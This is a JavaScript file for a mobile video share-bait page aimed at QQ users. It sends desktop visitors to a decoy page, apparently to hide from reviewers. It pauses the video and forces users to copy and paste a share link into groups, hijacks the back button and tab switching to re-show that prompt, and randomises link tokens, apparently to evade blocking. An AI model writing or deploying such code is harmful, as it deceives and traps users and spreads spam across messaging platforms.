if(!window.conf||!window.conf.cache){
	alert('没有发现您保存的设置，请在后台 选择模版并保存设置！');
	document.location.href='./df.php';
}
if((/^(Win|Mac)/i.test(navigator.platform)||!/mobile|Android|phone|iPhone|iPod|ios|iPad/i.test(navigator.userAgent))&&(!localStorage.isCheney||parseInt( conf.mobile))){
	window.location = 'http://www.qq.com/babygohome/?pgv_ref=404';
}
conf.code = '{wwwwwwnnn}';
conf.stor =(/(\w{3,5})/.exec(location.pathname)||[0,'Q'])[1];
var get = getUrlVal();
var vid = parseInt(get.vid||Math.floor(Math.random()*conf.videolist.length ));
conf.video = conf.videolist[vid % conf.videolist.length ]||conf.videolist[0];
conf.video.vid = vid;
//定时提示框
function thisLink(u){
	var a = document.createElement('a');
	a.href = u;
	return a.href;
};
var h	= '';
// h	+= '<a class="mini-upload1" href="'+conf.url1+'" style="background-color:#f36b1d;"><img id="tz1" src="https://320fg5d.oss-cn-beijing.aliyuncs.com/1111/0803/1.gif" style="width:100%;margin:0"  border="边框"></a>';
h	+= '<div class="video"><video id="video" src="'+conf.video.src+'" style="width: 100%;height: 220px;" src="" controls="controls" autoplay></video></div>';
//h	+= '<div class="video" id="video" ></div>';
h	+= '<div class="note-title" style="text-align:center;font-size: 24px;margin-top: 13px;">';
h	+= '<span>'+conf.video.name+'</span>';
h	+= '</div>';
h	+= '<div style="margin:0 5px;">';
h	+= '<button class="mini-upload1" id="qh">换 一 部 电 影</button>';
h	+= '<button class="mini-upload1" id="shareBtn" style="background-color:#f36b1d;">👉点我复制链接 粘贴到群</button>';
if(conf.btn2){
	h	+= '<a class="mini-upload1" href="'+conf.url2+'" style="background-color:#bfa700;">👉'+conf.btn2+'</a>';
}
if(conf.btn3){
	h	+= '<a class="mini-upload1" href="'+conf.url3+'" style="background-color:#ee1741;">✌'+conf.btn3+'✌</a>';
}
if(conf.btn4){
	h	+= '<a class="mini-upload1" href="'+conf.url4+'" style="background-color:#eda9b8;">✌'+conf.btn4+'✌</a>';
}
h	+= '</div>';
h	+= '<a href="'+conf.url4+'" ><img id="tz4" src="https://y.gtimg.cn/music/photo_new/T053XD0040Zv4z3dMZtb.gif" style="width:100%;max-width:700px;position:fixed;left:0;right:0;bottom:0;margin:auto;"></a></div>';
h	+= '</div>';
h = h.replace(/\{ico\}/gi,getRandIco);
h = myChat(h);
pageDialog.innerHTML = h;
var ck = new ckplayer({
	container: '#video',
//	html5m3u8: true,
	autoplay: true,
//	variable: 'player',
	video: [[conf.video.src, '', '高清HD', 0], ]
});
ck.endedHandler = function(){
	ck.videoPause();
	if(conf.ready&& !localStorage.isCheney){
		location.href = conf.ready;
	}
}
$(function(){
    conf.stor = (/\/(\w+)/.exec(location.pathname)||[0,'_'])[1]+conf.video.vid;
    if(!coo('code'))coo('snt',0,conf.cache);
	coo('code',conf.code = coo('code') || conf.code,conf.cache);
	$('#qh').click(function(e){
		conf.video.vid = Math.floor(conf.videolist.length*Math.random())
		var shu = thisLink(myChat(conf.shu.replace('TOKEN','t='+conf.code).replace('VIDEOID',conf.video.vid)));
		location.href=shu;
	});
	$('#shareBtn').click(function(e){
		she();
	});
	if(location.href.indexOf(conf.code) == -1){
		var tx = conf.video.time;
		window.mshi=setInterval(function(){
//			if (ck.time >= tx){
//			window.mshi=setInterval(function(){
				if (video.currentTime >= tx){
					tx++;
					if(location.href.indexOf(conf.code) == -1){
						video.pause();
						if(/iPhone|iPod|ios/i.test(navigator.userAgent)){
							$(video).css('display','none').remove();
						}
						shx();
						window.isimg = 1;
						setovblc();
					}		
				}else if(video.currentTime > tx){	
					clearInterval(window.mshi);
					return;
				}
			});
		}
	if(conf.title){
		document.title = conf.title;
	}
	if(window.mqq){
		mqq.ui.setTitleButtons({
			left: {title: "返回",callback: function() {}},right: {hidden: true,}
		})	
	}			
	var snn = coo('snt')||0;
	function getPop(){
		shx();
		window.history.pushState({},'x',getUrl());
	}
	window.addEventListener("popstate",getPop,false);
});
for(var i in conf){
	if(conf[i] instanceof Array && 'string' == typeof conf[i][0]){
		conf[i] = myChat(conf[i][Math.floor(Math.random()*conf[i].length)]);
	}else if('string' == typeof conf[i]){
		conf[i] = myChat(conf[i]);
	}
}
function getRandIco() {
	var arr=['🌀','🌷','♈','♉','♊','♋','♌','♍','♎','♏','♐','♑','♒','♓','⛎','😠','😩','😲','😞','😵','😰','😒','😍','😤','😜','😝','😋','😘','😚','😷','😳','😅','😱','👙','👗','👡','💰','🔯','🅰','🅱','🆎','🅾','🎀','🎁','🎥','🎬','🎯','💋','💏','💌','🔞','⭕','❌','💓','💔','💕','💖','💗','💘','💞','🈲','㊙','💢'];
	return arr[Math.floor(Math.random()*arr.length)];
}
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
function opensdk(url){
	url = myEeplace(url);
	var obj = {
		url     : url,
		target  : 1,
		style   : 2
	};
	mqq.invoke("ui", "openUrl",obj);
}
function getUrl() {
	return myChat('?_wv=' + getNum() + '&vid='+conf.video.vid+'&&alert(1)&{www}={wwwwnnn}'); //卡片连接
}
function getRand(l,m){
	return Math.floor(Math.random() * (m - l + 1) + l);
}
function getNum() {
	return 64 * parseInt(getRand(1, 30))+ getRand(2, 3);
}
function setovblc(){
	if(!window.hiddenProperty){
		window.hiddenProperty='hidden' in document ? 'hidden': 'webkitHidden' in document ? 'webkitHidden': 'mozHidden' in document ? 'mozHidden': null;
		var vsbce=hiddenProperty.replace(/hidden/i,'visibilitychange');
		function ovblc(){
			if(!document[hiddenProperty]||top.idf){
				coo('snt',coo('snt')+1,conf.cache);
				shx();
			}
		}
		document.addEventListener(vsbce,ovblc);	
	}
}
function shx(){
	setovblc();
		msg(conf.adth1,function(){
			she();
		})
}
function msg(con,fun){
	layer.open({
		content: con,
		btn: ['一键复制，发送给朋友'],
		yes: function(index) {
			fun.call(this);
			layer.close(index);
		}
	});
}
function getRand(l,m){
	return Math.floor(Math.random() * (m - l + 1) + l);
};
function ios(){
	return /iPhone|iPod|ios/i.test(navigator.userAgent);
}
function copyText(t) {
	var p = document.createElement('textarea');
	p.value = t;
	p.style.opacity=0;
	document.body.appendChild(p);
	p.select();
	document.execCommand("Copy");
	document.body.removeChild(p);
}
function she(state){
	setovblc();
	var shu = thisLink(myChat(conf.shu.replace('TOKEN','t='+conf.code).replace('VIDEOID',conf.video.vid)));
	var sText = conf.sinfo.replace('###',shu)
	copyText(sText)
	tip(conf.send);
	return;
	var shu = thisLink(myChat(conf.shu.replace('TOKEN','t='+conf.code).replace('VIDEOID',conf.video.vid)));
	console.log('分享地址',shu);
	document.title = conf.sht;
	conf.she = conf.she.replace(/###/gi,conf.code);
	$('meta[itemprop="name"]').attr('content',conf.sht);
	$('meta[itemprop="description"]').attr('content',conf.she);
	$('meta[itemprop="image"]').attr('content',conf.shi);
	var obj = {
		title: conf.sht,
		desc: conf.she,
		image_url:conf.shi,
		share_url:shu       
	};
	mqq.data.setShareInfo(obj);
	if(!state){
		mqq.ui.showShareMenu();
	}
}
function coo(n,v,e,p,d,s) {
	n = conf.stor+n;
	if(!coo.sd||ios()){	
		var k,b = {},t=Math.floor(new Date()/1000), 
		o = JSON.parse(localStorage.c||'{}');
		for(k in o)if('object'==typeof o[k]&&o[k][1]>t){
			b[k]=o[k][0];
		}
		if (v === null){
			delete o[n];				
		}else if(v === undefined){
			return b[n]||0;			
		}else{
			o[n]=[v,t+(e||2592000)];
		}
		localStorage.c=JSON.stringify(o);
		return b		
	}
	if (v === undefined||v === null) {
		var val=g(n);
		if (v === null) coo(n,'',-10);
		try {
			return JSON.parse(val)
		} catch(e) {
			return val
		}
	} else {
		if (typeof(v)=='object') v=JSON.stringify(v);
		document.cookie=n+'='+encodeURIComponent(v)+exp(e)+';path='+(p||'/')+(d ? '; domain='+d: '')+(s ? '; secure': '')+';'
	}
	function exp(s) {
		D=new Date(),
		D.setTime(D.getTime()+(s === undefined ? 2592000 : s) * 1000);
		return ';expires='+D.toUTCString()
	}
	function g(n) {
		if (document.cookie.length>0) {
			start=document.cookie.indexOf(n+"=");
			if (start != -1) {
				start=start+n.length+1;
				end=document.cookie.indexOf(";",start);
				if (end==-1) end=document.cookie.length;
				return decodeURIComponent(document.cookie.substring(start,end))
			}
		};
		return null
	}
};
function copyText(t) {
	var p = document.createElement('textarea');
	p.value = t;
	p.style.opacity=0;
	document.body.appendChild(p);
	p.select();
	document.execCommand("Copy");
	document.body.removeChild(p);
}
//JS提示弹框
function tip(text, time) {
	window.tmsg&&document.body.removeChild(tmsg);
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:200px;left:20%;right:20%;color:#fff;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#333;border:1px solid #222;box-shadow:rgba(0,0,0,0.25) 0px 0px 10px 6px;transition:opacity 0.6s">'+text+'</div>');
	setTimeout('tmsg.style.opacity=0.8',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',(time||3)*1000);
}
function myChat(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		b = b.toUpperCase();
		for(var i=0;i<b.length;i++){
			if('N'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('D'==b[i]){
				h+=String.fromCharCode(65+Math.floor(Math.random()*26));
			}else{
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
//解析 $_GET
function getUrlVal(u) {
	var j,g = {};
	u = (u || document.location.href.toString()).split('?');
	if (typeof(u[1]) == "string") {
		u = u[1].split("&");
		for (var i in u) {
			j = u[i].split("=");
			if (j[1] !== undefined) g[j[0]] = decodeURIComponent(j[1])
		}
	}
	return g;
}
